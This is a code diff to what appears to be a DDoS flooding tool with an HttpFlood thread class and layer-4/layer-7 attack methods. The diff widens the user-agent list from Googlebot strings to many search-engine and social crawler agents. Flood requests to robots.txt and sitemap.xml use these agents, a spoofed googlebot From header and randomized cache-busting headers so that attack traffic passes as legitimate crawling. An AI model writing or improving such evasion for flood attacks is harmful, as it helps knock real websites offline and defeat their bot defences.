@@ -134,13 +134,73 @@ class Methods:
     ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}
 
 
-google_agents = [
-    "Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
-    "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
-    "+http://www.google.com/bot.html)) "
-    "Googlebot/2.1 (+http://www.google.com/bot.html)",
-    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
+search_engine_agents = [
+    # ---------------- Google ----------------
+    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
+    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; "
+    "+http://www.google.com/bot.html) Chrome/103.0.5060.134 Safari/537.36",
+    "Googlebot-Image/1.0",
+    "Googlebot-Video/1.0",
+    "Googlebot-News",
+    "AdsBot-Google (+http://www.google.com/adsbot.html)",
+    "AdsBot-Google-Mobile-Apps",
+    "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html)",
+    "Mediapartners-Google",
+    "FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)",
+
+    # ---------------- Bing / Microsoft ----------------
+    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+    "BingPreview/1.0b",
+    "AdIdxBot/2.0 (+http://www.bing.com/bingbot.htm)",
+
+    # ---------------- Yahoo ----------------
+    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
+    "Yahoo! Slurp China",
+
+    # ---------------- Yandex ----------------
+    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
+    "YandexMobileBot/3.0 (+http://yandex.com/bots)",
+    "YandexImages/3.0 (+http://yandex.com/bots)",
+    "YandexVideo/3.0 (+http://yandex.com/bots)",
+    "YandexNews/3.0 (+http://yandex.com/bots)",
+
+    # ---------------- Baidu ----------------
+    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
+    "Baiduspider-image (+http://www.baidu.com/search/spider.html)",
+    "Baiduspider-video (+http://www.baidu.com/search/spider.html)",
+
+    # ---------------- DuckDuckGo ----------------
+    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
+    "DuckDuckBot/2.0; (+http://duckduckgo.com/duckduckbot.html)",
+
+    # ---------------- Applebot ----------------
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
+    "(KHTML, like Gecko) Version/14.0 Safari/605.1.15 (Applebot/0.1; "
+    "+http://www.apple.com/go/applebot)",
+
+    # ---------------- Facebook / Social ----------------
+    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
+    "Facebot/1.0",
+
+    # ---------------- Twitter ----------------
+    "Twitterbot/1.0",
+
+    # ---------------- LinkedIn ----------------
+    "LinkedInBot/1.0 (+https://www.linkedin.com/)",
+
+    # ---------------- Pinterest ----------------
+    "Pinterest/0.2 (+http://www.pinterest.com/bot.html)",
+
+    # ---------------- Other Major Bots ----------------
+    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
+    "SemrushBot/7~bl (+http://www.semrush.com/bot.html)",
+    "MJ12bot/v1.4.8 (http://mj12bot.com/)",
+    "Sogou web spider/4.0 (+http://www.sogou.com/docs/help/webmasters.htm#07)",
+    "Exabot/3.0 (+http://www.exabot.com/go/robot)",
+    "SeznamBot/3.2 (http://napoveda.seznam.cz/seznambot-intro/)",
+    "CCBot/2.0 (+http://commoncrawl.org/faq/)",
+    "DotBot/1.1 (+http://www.opensiteexplorer.org/dotbot, help@moz.com)"
 ]
 
 
@@ -942,14 +1002,14 @@ class HttpFlood(Thread):
             "Host: %s\r\n" % self._target.raw_authority +
             "Connection: Keep-Alive\r\n"
             "Accept: text/plain,text/html,*/*\r\n"
-            "User-Agent: %s\r\n" % randchoice(google_agents) +
+            "User-Agent: %s\r\n" % randchoice(search_engine_agents) +
             "Accept-Encoding: gzip,deflate,br\r\n\r\n"), str.encode(
             "GET /sitemap.xml HTTP/1.1\r\n"
             "Host: %s\r\n" % self._target.raw_authority +
             "Connection: Keep-Alive\r\n"
             "Accept: */*\r\n"
             "From: googlebot(at)googlebot.com\r\n"
-            "User-Agent: %s\r\n" % randchoice(google_agents) +
+            "User-Agent: %s\r\n" % randchoice(search_engine_agents) +
             "Accept-Encoding: gzip,deflate,br\r\n"
             "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9),
                                           ProxyTools.Random.rand_str(4)) +
